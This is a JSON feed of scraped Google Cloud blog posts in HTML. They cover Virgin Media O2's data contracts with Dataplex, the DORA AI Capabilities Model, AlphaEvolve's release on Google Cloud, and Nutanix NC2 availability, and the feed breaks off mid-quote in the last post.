[
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/data-analytics/vmo2-uses-data-contracts-to-build-scalable-ai-and-data-products/",
        "title": "How Virgin Media O2 uses data contracts to enable trusted data and scalable AI products",
        "thumbnail": null,
        "author": "Dženan Softić",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">As organizations scale their data and AI capabilities, many are adopting federated data architectures to empower domain teams, accelerate innovation, and foster ownership. This decentralization is essential for building AI products that are adaptable and data-driven — but it also introduces new challenges: maintaining trust, ensuring data quality, and enforcing governance across distributed teams and systems.</span></p>\n<p><span style=\"vertical-align: baseline;\">At Virgin Media O2 (VMO2), in collaboration with Google Cloud, we’ve developed a robust and scalable approach to address these challenges: </span><strong style=\"vertical-align: baseline;\">data contracts</strong><span style=\"vertical-align: baseline;\">. These contracts serve as the data quality and assurance layer for our data products, ensuring that every dataset we publish is reliable, documented, and ready for consumption. Defined at the asset level, such as individual BigQuery tables or Google Cloud Storage buckets, data contracts are redefining how we manage and share data, enabling the creation of trusted and scalable AI products across our data </span><span style=\"vertical-align: baseline;\">mesh.</span></p>\n<p><span style=\"vertical-align: baseline;\">A data contract acts as a formal, machine-readable agreement between a data producer and its users. It serves as an explicit interface, defining the data's expected characteristics, including its </span><strong style=\"vertical-align: baseline;\">schema</strong><span style=\"vertical-align: baseline;\">, </span><strong style=\"vertical-align: baseline;\">semantics</strong><span style=\"vertical-align: baseline;\">, </span><strong style=\"vertical-align: baseline;\">data quality metrics</strong><span style=\"vertical-align: baseline;\">, and </span><strong style=\"vertical-align: baseline;\">Service Level Objectives (SLOs)</strong><span style=\"vertical-align: baseline;\"> like freshness and completeness. See below an example of a data contract that we construct.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"1 - Data Contract anatomy\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/1_-_Data_Contract_anatomy.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The power of this approach lies in moving beyond static documentation. Because they are machine-readable, data contracts become </span><strong style=\"vertical-align: baseline;\">living guarantees</strong><span style=\"vertical-align: baseline;\"> with </span><strong style=\"vertical-align: baseline;\">continuous enforcement</strong><span style=\"vertical-align: baseline;\"> and real-time validation directly within data pipelines. This proactive monitoring allows teams to detect schema changes or SLA breaches early, transforming data quality from a reactive fix into a scalable, automated mechanism. By embedding </span><strong style=\"vertical-align: baseline;\">product thinking</strong><span style=\"vertical-align: baseline;\">, this methodology elevates data from a simple byproduct to a </span><strong style=\"vertical-align: baseline;\">first-class data product</strong><span style=\"vertical-align: baseline;\">, ensuring that its context and intent travel with it through the data lifecycle. This creates the trusted foundation essential for building reliable AI products at scale.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Practical implementation</span></h3>\n<p><span style=\"vertical-align: baseline;\">To put these principles into practice, we designed a scalable platform on Google Cloud using a </span><strong style=\"vertical-align: baseline;\">hub-and-spoke data contracts solution</strong><span style=\"vertical-align: baseline;\">. This architecture balances centralized governance with federated ownership. A central \"Hub\" team provides the self-service data contract capabilities including cloud infrastructure, while departmental \"Spoke\" teams are empowered to own the contract and data quality for their data products.</span></p>\n<p><span style=\"vertical-align: baseline;\">This is all brought to life through a fully automated, GitOps-driven workflow. A data producer simply can define their data contract in a YAML file for different types of assets like BigQuery table or Google Cloud Storage bucket, and commit it to a GitLab repository. The data contract is then verified dynamically against customizable validation schemas. However, even after validation, the contract exists only as a static blueprint. This is where </span><a href=\"https://cloud.google.com/dataplex\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Dataplex Universal Catalog</span></a><span style=\"vertical-align: baseline;\"> becomes the key, acting as the engine that transforms this static declaration into enforceable agreement on the actual data.</span></p>\n<p><span style=\"vertical-align: baseline;\">Dataplex Universal Catalog is an intelligent data fabric that unifies data management and governance, providing the scalable engine needed to operationalize our contracts. We leverage two core capabilities of Dataplex Universal Catalog to make this possible:</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://cloud.google.com/dataplex/docs/auto-data-quality-overview\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Dataplex auto data quality</strong></a><strong style=\"vertical-align: baseline;\">:</strong><span style=\"vertical-align: baseline;\"> This is the enforcement engine. Our CI/CD automation </span><a href=\"https://cloud.google.com/dataplex/docs/manage-data-quality-rules-as-code\"><span style=\"text-decoration: underline; vertical-align: baseline;\">reads the SLOs from the YAML</span></a><span style=\"vertical-align: baseline;\"> contract and provision Data Quality Scan jobs. These jobs use a combination of Dataplex's powerful pre-defined rules for common checks like </span><code style=\"vertical-align: baseline;\">null value</code><span style=\"vertical-align: baseline;\"> monitoring and schema change detection, as well as custom rules to enforce unique business logic. This \"Data Governance as Code\" approach ensures our quality standards are version-controlled, repeatable, and scalable.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://cloud.google.com/dataplex/docs/data-profiling-overview\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Dataplex data profiling</strong></a><strong style=\"vertical-align: baseline;\">:</strong><span style=\"vertical-align: baseline;\"> To help teams write effective contracts, we use Dataplex to continuously scan and analyze data assets. This provides vital statistical metadata and insights into the data, such as null frequencies, value ranges, and data type distributions. This proactive data discovery helps producers set realistic quality thresholds and gives users a deeper understanding of the data they are using.</span></p>\n</li>\n</ol>\n<p><span style=\"vertical-align: baseline;\">Once these rules and scans are defined in Dataplex, </span><a href=\"https://cloud.google.com/composer\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Cloud Composer</span></a><span style=\"vertical-align: baseline;\"> then orchestrates their execution. It uses the static YAML contracts as a blueprint to dynamically generate the necessary DAGs, which can be further customized for each individual asset. The results are written to BigQuery, making the quality status of every data product transparent and actionable. To provide a unified view for central monitoring, </span><a href=\"https://docs.cloud.google.com/bigquery/docs/authorized-views\"><span style=\"text-decoration: underline; vertical-align: baseline;\">BigQuery authorized views</span></a><span style=\"vertical-align: baseline;\"> are used to aggregate data quality results and contract statuses from all departments without creating data copies. We also leverage </span><a href=\"https://cloud.google.com/pubsub?gclsrc=aw.ds&amp;gad_source=1&amp;gad_campaignid=20645498068&amp;gclid=Cj0KCQjwsPzHBhDCARIsALlWNG2svkcL-6PmHFhTIeJKisk8IzxLf9YqgSZQKy4dPTEOroJ__j_fSYoaAlr1EALw_wcB&amp;hl=en\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Pub/Sub</span></a><span style=\"vertical-align: baseline;\"> as an event bus to enable the central team to share department-specific data with respective Spokes.</span></p>\n<p><span style=\"vertical-align: baseline;\">The diagram below illustrates this workflow in practice, focusing on the core lifecycle of a contract while simplifying the broader hub-and-spoke architecture.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"2 - Data Contracts Architecture\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/2_-_Data_Contracts_Architecture.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">To maintain trust at scale, real-time observability and alerting are vital. Our platform provides dashboards that track contract compliance, while automated alerts flag schema drift, SLA violations, or quality anomalies. For data users, this transparency is critical. They reference the contract definitions to clearly understand the agreed-upon SLOs (such as freshness or completeness) and rely on the dashboards to verify that the data product is meeting those promises before integrating it into their workflows. These signals create powerful feedback loops between data producers and users, fostering faster resolution and closer collaboration.</span></p>\n<p><span style=\"vertical-align: baseline;\">This real-time visibility transforms data quality from a reactive activity into a proactive practice. As shown in our dashboards, teams get an immediate overview of platform health, data quality scores, and contract compliance.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"4 - DQ Dashboard\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/4_-_DQ_Dashboard.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"3 - Data Contract Dashboard\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/3_-_Data_Contract_Dashboard.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Furthermore, they can drill down into specific alerts, giving them the context needed to treat data issues with the same urgency as application outages — a critical step in achieving operational excellence for AI and analytics.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Beyond quality: Compliance, governance, and data-product thinking</span></h3>\n<p><span style=\"vertical-align: baseline;\">Beyond data quality, contracts play a crucial role in compliance and governance. By codifying privacy and regulatory requirements — such as GDPR, HIPAA, or PCI — directly within the contract, organizations can automate classification, access control, and auditability. This reduces the risk of non-compliance, especially in federated environments where manual oversight cannot scale.</span></p>\n<p><span style=\"vertical-align: baseline;\">Finally, product thinking ties everything together. Data contracts embody the mindset that data is a product, not a byproduct. They embed ownership, accountability, and discoverability into every stage of the lifecycle — empowering teams to deliver trusted, scalable, and resilient AI products.</span></p>\n<h3><span style=\"vertical-align: baseline;\">A foundation for the future</span></h3>\n<p><span style=\"vertical-align: baseline;\">By operationalizing trust through data contracts, we are fostering a culture of shared responsibility and data-first thinking. This federated model does more than simply fix pipelines; it builds the trusted foundation needed to scale next-generation AI. It ensures that the resilient AI tools empowering our teams are built on data that is reliable, consistent, and well-defined. As we innovate, our decisions are guided by trusted information. And while full realization takes time, the strategic impact is clear.</span></p>\n<p><span style=\"vertical-align: baseline;\">Learn more about </span><a href=\"https://cloud.google.com/dataplex\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Dataplex Universal Catalog</span></a><span style=\"vertical-align: baseline;\"> to explore this use case.</span></p>\n<hr />\n<p><sub><span style=\"font-style: italic; vertical-align: baseline;\">The authors would like to thank and recognise the team for their contributions on this project: Eric Tyree, Director, Machine Learning Operations &amp; Data Science at VMO2, Vinay Pai, Head of Data Architecture at VMO2, Shivang Bhargava, Senior Cloud Data Engineer at VMO2, Christopher Slattery, Data Engineer at VMO2, Rakesh Agrwal, Product Manager at VMO2, Sameer Zubair, Principal Platforms Tech lead at VMO2, Philip Adler Senior Software Engineer at VMO2, Carys Williams Data Scientist at VMO2, Li Wang Data Engineer at VMO2, Sobhan Afroosheh, Customer Engineer at Google, Janos Bana, Technical Solutions Consultant, Google.</span></sub></p></div>",
        "published_date": "2025-12-09 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/ai-machine-learning/from-adoption-to-impact-putting-the-dora-ai-capabilities-model-to-work/",
        "title": "From adoption to impact: Putting the DORA AI Capabilities Model to work",
        "thumbnail": "https://storage.googleapis.com/gweb-cloudblog-publish/images/DORA_AI_Capa-blog-2436x1200.max-600x600.png",
        "author": "Allison Park",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The </span><a href=\"https://cloud.google.com/blog/products/ai-machine-learning/announcing-the-2025-dora-report\"><span style=\"text-decoration: underline; vertical-align: baseline;\">2025 State of AI-assisted Software Development report</span></a><span style=\"vertical-align: baseline;\"> revealed a critical truth: AI is an amplifier. It magnifies the strengths of high-performing organizations and the dysfunctions of struggling ones.</span></p>\n<p><span style=\"vertical-align: baseline;\">While AI adoption is now near-universal, with 90% of developers using it in their daily workflows, success is not guaranteed. Our cluster analysis of nearly 5,000 technology professionals reveals significant variation in team performance: Not everyone experiences the same outcomes from adopting AI. </span></p>\n<p><span style=\"vertical-align: baseline;\">From this disparity, we can conclude that how they are using AI is a critical factor. We wanted to understand the particular capabilities and conditions that enable teams to achieve positive outcomes, leading us to develop the </span><a href=\"https://cloud.google.com/resources/content/2025-dora-ai-capabilities-model-report\"><span style=\"text-decoration: underline; vertical-align: baseline;\">DORA AI Capabilities Model report</span></a><span style=\"vertical-align: baseline;\">. </span></p>\n<p><span style=\"vertical-align: baseline;\">This companion guide to the 2025 DORA Report is designed to help you navigate our new reality. It provides actionable strategies, implementation tactics, and measurement frameworks to help technology leaders build an environment where AI thrives.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Seven capabilities that amplify success</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Successfully using AI requires cultivating your technical and cultural environment. From the same set of respondents who participated in the 2025 DORA survey, we identified seven foundational capabilities that are proven to amplify the positive impact of AI on organizational performance:</span></p>\n<ol>\n<li><strong style=\"vertical-align: baseline;\">Clear and communicated AI stance</strong><span style=\"vertical-align: baseline;\">: Ambiguity creates risk. A clear policy provides the psychological safety developers need to experiment effectively.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Healthy data ecosystems</strong><span style=\"vertical-align: baseline;\">: AI is only as good as the data it learns from. Investing in high-quality, accessible, and unified internal data significantly amplifies AI's benefits.</span></li>\n<li><strong style=\"vertical-align: baseline;\">AI-accessible internal data</strong><span style=\"vertical-align: baseline;\">: This involves \"context engineering,\" moving beyond simple prompts to securely connect AI tools to your internal documentation and codebases.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Strong version control practices</strong><span style=\"vertical-align: baseline;\">: As AI increases the volume and velocity of code generation, version control becomes your critical safety net. Frequent commits and robust rollback capabilities are essential for maintaining stability in an AI-assisted world.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Working in small batches</strong><span style=\"vertical-align: baseline;\">: AI can easily generate massive blocks of code, which are hard to review and test. Enforcing the discipline of small batches counteracts this risk, ensuring that speed translates to product performance rather than instability.</span></li>\n<li><strong style=\"vertical-align: baseline;\">User-centric focus</strong><span style=\"vertical-align: baseline;\">: Speed is irrelevant if you are moving in the wrong direction. Adopting AI tools can actually harm teams that lack a user-centric focus. Keeping user needs as your North Star is essential for guiding AI-assisted development.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Quality internal platforms</strong><span style=\"vertical-align: baseline;\">: A platform provides the automated, secure \"paved roads\" that allow AI benefits to scale across the organization. It prevents individual productivity gains from being lost to downstream bottlenecks.</span></li>\n</ol></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"dora-ai-capabilities-model\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/dora-ai-capabilities-model.max-1000x1000.jpg\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>The DORA AI Capabilities Model shows which capabilities amplify the effect of AI adoption on</p><p>specific outcomes</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">Where to start: Assessing your team</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Every organization starts their AI journey differently. To help you prioritize, this report introduces seven distinct team archetypes derived from our cluster analysis. These profiles range from \"harmonious high-achievers,\" who excel in both performance and well-being, to teams facing \"foundational challenges\" or those stuck in a \"legacy bottleneck,\" where unstable systems undermine morale.</span></p>\n<p><span style=\"vertical-align: baseline;\">Identifying the profile that best matches your team can help pinpoint the most impactful interventions. For example, a \"high impact, low cadence\" team might prioritize automation to improve stability, while a team \"constrained by process\" might focus on reducing friction through a better AI stance.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Digging deeper with Value Stream Mapping</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Once you understand your team's profile, how do you direct your efforts? The report includes a step-by-step facilitation guide for running a Value Stream Mapping (VSM) exercise.</span></p>\n<p><span style=\"vertical-align: baseline;\">VSM acts as an AI force multiplier. By visualizing your flow from idea to customer, you can identify where work waits and where friction exists. This ensures that the efficiency gains from AI aren't just creating local optimizations that pile up work downstream, but are instead channeled into solving system-level constraints.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Get better at getting better</strong></h3>\n<p><span style=\"vertical-align: baseline;\">AI adoption is an organizational transformation. The greatest returns come not from the tools themselves, but from investing in the foundational systems that enable them.</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://cloud.google.com/resources/content/2025-dora-ai-capabilities-model-report\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Download the full report</span></a></p>\n</li>\n<li><span style=\"vertical-align: baseline;\">Join the </span><a href=\"https://dora.community/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">DORA community</span></a></li>\n</ul></div>",
        "published_date": "2025-12-09 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/ai-machine-learning/alphaevolve-on-google-cloud/",
        "title": "AlphaEvolve on Google Cloud: AI for agentic discovery and optimization",
        "thumbnail": "https://storage.googleapis.com/gweb-cloudblog-publish/images/0-banner_picture.max-600x600.jpg",
        "author": "Anant Nawalgaria",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Innovators in science and engineering face a common barrier: the search space for solving complex problems — like designing a new chip or discovering a drug molecule — is often too vast for standard brute-force methods to explore effectively. </span></p>\n<p><span style=\"vertical-align: baseline;\">To help you overcome this challenge, we are releasing </span><a href=\"https://deepmind.google/blog/alphaevolve-a-gemini-powered-coding-agent-for-designing-advanced-algorithms/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AlphaEvolve</span></a><span style=\"vertical-align: baseline;\">, a Gemini-powered coding agent for designing advanced algorithms, to Google Cloud, in private preview..</span></p>\n<h3><strong style=\"vertical-align: baseline;\">The challenge for innovators in science </strong></h3>\n<p><span style=\"vertical-align: baseline;\">Many of the most challenging and potentially valuable problems  in the world are related to optimization. You might be trying to minimize latency in a data center, maximize the stability of a protein, or find the most efficient route for a logistics fleet.</span></p>\n<p><span style=\"vertical-align: baseline;\">AlphaEvolve pairs the creative problem-solving capabilities of our Gemini models with automated evaluators that verify answers, along with an evolutionary framework to improve upon the most promising ideas.</span></p>\n<p><span style=\"vertical-align: baseline;\">It then tests these changes against a \"ground truth\" evaluator that you define. If the new code performs better, it becomes the parent for the next generation. This creates a feedback loop that allows the system to learn and improve over time, eventually discovering algorithms that are significantly more efficient than the ones you started with.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">How it works:</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Here is how Alphaevolve discovers and improves upon existing algorithms in more detail:</span></p>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">Input: </strong><span style=\"vertical-align: baseline;\">You define a problem specification, evaluation logic (to measure how well a proposed solution works), and a seed initialization program. The seed is a compile-ready piece of code that is the algorithm that you want to optimize. To start, it solves the problem, even if sub-optimally.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Mutation</strong><span style=\"vertical-align: baseline;\">: Gemini models (Flash for speed, Pro for depth) process the context and generate mutated, optimized versions of the code that are added to the “population space.”</span></li>\n<li><strong style=\"vertical-align: baseline;\">Evolution</strong><span style=\"vertical-align: baseline;\">: Evolution algorithms select which of the various code mutations from the population space to combine and further mutate to prioritize as the starting point for the next evolution of mutations.  </span></li>\n<li><strong style=\"vertical-align: baseline;\">Loop: </strong><span style=\"vertical-align: baseline;\">The results from the Evaluation scores are then used by the ensemble of LLMs to generate the next set of improved solutions. The cycle repeats recursively, evolving the codebase from the initial seeds to state-of-the-art algorithms.</span></li>\n</ul>\n<h3><strong style=\"vertical-align: baseline;\">Proven impact at Google</strong></h3>\n<p><span style=\"vertical-align: baseline;\">At Google, we have already used this technology to tackle some of our own hardest engineering problems.</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Data center efficiency:</strong><span style=\"vertical-align: baseline;\"> AlphaEvolve found a better way to schedule tasks in our data centers, continuously recovering on average 0.7% of our global compute resources.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Gemini training:</strong><span style=\"vertical-align: baseline;\"> AlphaEvolve sped up a vital kernel in Gemini’s architecture by 23%, leading to a 1% reduction in Gemini's training time.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Hardware design:</strong><span style=\"vertical-align: baseline;\"> It accelerated the design of our next-generation TPUs by discovering more efficient arithmetic circuits.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">To learn more about impact, read </span><a href=\"https://storage.googleapis.com/deepmind-media/DeepMind.com/Blog/alphaevolve-a-gemini-powered-coding-agent-for-designing-advanced-algorithms/AlphaEvolve.pdf\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">our paper</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">How AlphaEvolve can help businesses across industries </strong></h3>\n<p><span style=\"vertical-align: baseline;\">You can apply this same engine to your own proprietary data and unique algorithmic challenges. Here are a few ways improved algorithms can potentially help different industries:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Biotech and pharma:</strong><span style=\"vertical-align: baseline;\"> Optimize the algorithms used for molecular simulation, which helps shorten the timelines for drug discovery and increases the success rate of new therapeutics.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Logistics and supply chain:</strong><span style=\"vertical-align: baseline;\"> Discover superior heuristics for routing and inventory management, helping you reduce fuel costs and build more resilient delivery networks.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Financial services:</strong><span style=\"vertical-align: baseline;\"> Evolve algorithmic risk models to manage complex portfolios more effectively.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Energy:</strong><span style=\"vertical-align: baseline;\"> Optimize load balancing on smart grids to improve stability and better integrate renewable energy sources.</span></p>\n</li>\n</ul>\n<h3><strong style=\"vertical-align: baseline;\">Get started on Google Cloud</strong></h3>\n<p><span style=\"vertical-align: baseline;\">AlphaEvolve is made to help with complex optimization problems that you can define in code and objectively measure. The AlphaEvolve Service API is now available through an Early access program with Google Cloud. If you have one of these problems and are interested in participating in the Early Access Program, please reach out to your Google Cloud <span><span style=\"vertical-align: baseline;\">Representative</span></span>.</span></p></div>",
        "published_date": "2025-12-09 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/topics/partners/nutanix-nc2-generally-available-google-cloud/",
        "title": "Nutanix NC2 is now officially supported on Google Cloud",
        "thumbnail": null,
        "author": "Ziv Kalmanovich",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Today, we are thrilled to announce Nutanix Cloud Clusters (NC2) is generally available on Google Cloud.</span></p>\n<p><span style=\"vertical-align: baseline;\">NC2 on Google Cloud is designed to migrate and modernize specialized, regulated, and mission-critical applications without refactoring your workloads or compromising on performance. This partnership brings the power of Google Cloud’s infrastructure and advanced AI models to your hybrid cloud, without compromising on data residency, connectivity, or operational consistency. You can now run your Nutanix Hybrid Cloud directly on </span><a href=\"https://docs.cloud.google.com/compute/docs/instances/bare-metal-instances\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Compute Engine</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n<p style=\"padding-left: 40px;\"><span style=\"font-style: italic; vertical-align: baseline;\">\"The General Availability of Nutanix Cloud Clusters (NC2) on Google Cloud is a significant milestone empowering our joint customers to become AI-ready. We are excited to extend the simplicity and resilience of Nutanix NC2 onto Google Cloud's high-performance workload-optimized compute. Nutanix on Google Cloud enables our customers to migrate and modernize their critical workloads while unlocking the full power of Google’s industry-leading data and AI capabilities.\" </span><span style=\"vertical-align: baseline;\">- Saveen Pakala, VP, Product Management, Hybrid Cloud, Nutanix</span></p>\n<p><span style=\"vertical-align: baseline;\">Nutanix and Google Cloud allow you to maximize agility and minimize disruption for your critical applications. By combining NC2's enterprise flexibility with Google Cloud's power, you gain access to three core advantages. First, your workloads run on Compute Engine’s dynamically scalable workload-optimized infrastructure powering all machine families. Nutanix NC2 supports Compute Engine bare metal instances in the </span><a href=\"https://docs.cloud.google.com/compute/docs/storage-optimized-machines?_gl=1*2vt8da*_up*MQ..&amp;gclid=CjwKCAiAqfe8BhBwEiwAsne6gduqCwwkpJZbE9aPtQmusSUIJYOzGeKiVzaE-1_M9aml0iqY5L8_IBoCh90QAvD_BwE&amp;gclsrc=aw.ds#z3_machine_types\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Z3</span></a><span style=\"vertical-align: baseline;\"> and </span><a href=\"https://docs.cloud.google.com/compute/docs/general-purpose-machines#c4_series\"><span style=\"text-decoration: underline; vertical-align: baseline;\">C4</span></a><span style=\"vertical-align: baseline;\"> families. These are powered by the </span><a href=\"https://cloud.google.com/titanium\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Titanium offload system</span></a><span style=\"vertical-align: baseline;\"> and leverage </span><a href=\"https://cloud.google.com/compute/docs/disks/local-ssd\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Titanium SSDs</span></a><span style=\"vertical-align: baseline;\"> for</span><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">low-latency, high-throughput storage performance</span><strong style=\"vertical-align: baseline;\">, hosted in Google Cloud with </strong><span style=\"vertical-align: baseline;\">global reach, enterprise-grade security</span><strong style=\"vertical-align: baseline;\">, </strong><span style=\"vertical-align: baseline;\">and commitment to sustainability. Second, you accelerate AI innovation</span><strong style=\"vertical-align: baseline;\"> by co-locating data and machine learning services like </strong><span style=\"vertical-align: baseline;\">Gemini Enterprise</span><strong style=\"vertical-align: baseline;\"> and </strong><span style=\"vertical-align: baseline;\">Vertex AI</span><strong style=\"vertical-align: baseline;\">. Finally, you can save costs by dynamically </strong><span style=\"vertical-align: baseline;\">scaling capacity</span><strong style=\"vertical-align: baseline;\"> and  utilizing </strong><span style=\"vertical-align: baseline;\">committed use discounts (CUDs)</span><strong style=\"vertical-align: baseline;\"> and </strong><span style=\"vertical-align: baseline;\">Flex CUDs</span><strong style=\"vertical-align: baseline;\">.</strong></p>\n<h3><span style=\"vertical-align: baseline;\">Key use cases to accelerate your cloud journey</span></h3>\n<p><span style=\"vertical-align: baseline;\">The integration of NC2 on Google Cloud offers flexible, strategic options for hybrid cloud operations. Beyond consolidation and cost control, these capabilities set the stage for true modernization:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Seamless workload migration: Move entire applications between your on-premises Nutanix environment and Google Cloud without re-factoring or re-architecting. </strong><span style=\"vertical-align: baseline;\">This capability saves significant time during data center consolidation.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Consistent operations: Maintain the </strong><span style=\"vertical-align: baseline;\">same management plane, security policies, and automation</span><strong style=\"vertical-align: baseline;\"> across your private data center and Google Cloud, which dramatically reduces operational complexity and training costs.</strong></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Disaster recovery (DR): Leverage Google Cloud as a robust and cost-efficient recovery target. </strong><span style=\"vertical-align: baseline;\">Usage of a minimal “pilot light” cluster reduces compute costs, so you scale up only when a disaster event occurs.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Capacity bursting: Instantly add capacity in the cloud to handle seasonal demands, VDI workloads, development/test </strong><span style=\"vertical-align: baseline;\">cycles</span><strong style=\"vertical-align: baseline;\">, or requirements from mergers and acquisitions (M&amp;A).</strong></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">License portability: Protect your software investments by easily moving your existing </strong><span style=\"vertical-align: baseline;\">Nutanix software licenses</span><strong style=\"vertical-align: baseline;\"> to Google Cloud as your business needs evolve.</strong></p>\n</li>\n</ul>\n<p style=\"padding-left: 40px;\"><span style=\"font-style: italic; vertical-align: baseline;\">“Like many others, we are always on a journey to modernize and shift to achieve the best outcomes for our customers. Nutanix Cloud Clusters (NC2) on Google Cloud brings us a solid platform to continue our hybrid cloud expansion. Our ability to seamlessly run workloads on-premises and on NC2 on Google Cloud without having to re-factor is increasingly valuable as we continue our modernization journey. We look forward to continuing our strong 